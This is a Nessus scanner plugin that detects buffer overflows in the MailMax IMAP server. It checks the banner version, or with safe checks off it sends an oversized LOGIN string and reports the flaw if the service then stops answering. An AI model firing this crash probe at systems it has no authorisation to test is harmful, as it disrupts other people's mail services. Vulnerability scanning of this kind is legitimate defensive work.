#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#


 desc["english"] = "
Synopsis :

The remote SMTP and IMAP servers are prone to buffer overflow attacks. 

Description :

The remote host is running a version of the MailMax mail server that is
vulnerable to various overflows.  These issues may allow an
unauthenticated remote attacker to disable the affected service and
possibly to execute arbitrary commands on the affected host. 

See also :

http://www.securityfocus.com/archive/1/318290

Solution : 

Upgrade to MailMax 5.0.10.8 or newer

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if(description)
{
 script_id(11598);
 script_bugtraq_id(2312, 7326);
 script_cve_id("CVE-1999-0404");
 script_version ("$Revision: 1.9 $");

 
 name["english"] = "MailMax SMTP / IMAP overflows";
 script_name(english:name["english"]);
 
 script_description(english:desc["english"]);
 
 summary["english"] = "Overflows the remote IMAP server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Gain a shell remotely";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#

include("imap_func.inc");

port = get_kb_item("Services/imap");
if(!port)port = 143;
if (!get_port_state(port)) exit(0);

banner = get_imap_banner(port:port);
if (!banner || "MailMax " >!< banner) exit(0);


if(safe_checks())
{
  if(egrep(pattern:"MailMax [1-5][^0-9]", string:banner))
  {
    report = string(
      desc["english"],
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus has determined the flaw exists with the application\n",
      "simply by looking at the version in the IMAP server's banner.\n"
    );
    security_hole(port:port, data:report);
  }
  exit(0);
}

soc = open_sock_tcp(port);
if(soc)
{
  r = recv_line(socket:soc, length:4096);
  if ( ! r ) exit(0);
   send(socket:soc, data:string("0000 CAPABILITY\r\n"));
   r = recv_line(socket:soc, length:4096);
   r = recv_line(socket:soc, length:4096);
   send(socket:soc, data:'0001 LOGIN "nobody@example.com" "'+crap(50)+'\r\n');

   r = recv_line(socket:soc, length:4096);
   r = recv_line(socket:soc, length:4096);
   close(soc);

   soc = open_sock_tcp(port);
   if(!soc){security_hole(port); exit(0);}
   r = recv_line(socket:soc, length:4096);
   if(!r)security_hole(port);
   close(soc);  
}
